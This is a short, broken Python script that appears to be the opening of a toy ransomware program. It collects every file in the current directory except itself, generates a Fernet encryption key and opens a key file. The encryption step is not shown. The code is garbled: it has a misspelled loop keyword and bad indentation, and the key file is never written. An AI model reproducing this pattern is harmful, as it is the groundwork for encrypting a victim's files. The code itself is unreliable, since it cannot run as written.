import os
import cryptography.fernet
from cryptography.fernet import Fernet

files = []

for file ins os.listdir():
if file == "py-3.py":
            continue
if os.path.isfile(file):
            files.append(file)     

print(files)  

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
print (key)